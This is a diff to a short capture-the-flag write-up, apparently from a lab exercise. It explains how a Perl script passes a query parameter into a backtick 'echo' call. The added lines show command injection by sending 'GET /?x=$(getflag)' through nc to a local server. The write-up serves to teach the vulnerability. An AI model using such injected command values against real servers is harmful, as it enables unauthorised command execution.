@@ -12,6 +12,18 @@ sub x {
 x(param("x"));
 ```
 - this program shows that a webserver is listening on localhost:4747 and expecting a x param, which will be passed to a sub routine.
+```
+print \`echo $y 2>&1\`;
+```
+- this line allows the output of **echo $y to be passed to print function**.
+- we only need to pass our exploit *$(getflag)* to echo, this will runs as a sub command .
+    - connect using
+    ```
+    nc localhost 4747
+    ```
+    - GET /?x=$(getflag)
+    ```
+
 
 ## Ressources
-[command substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html)
+- [command substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html)
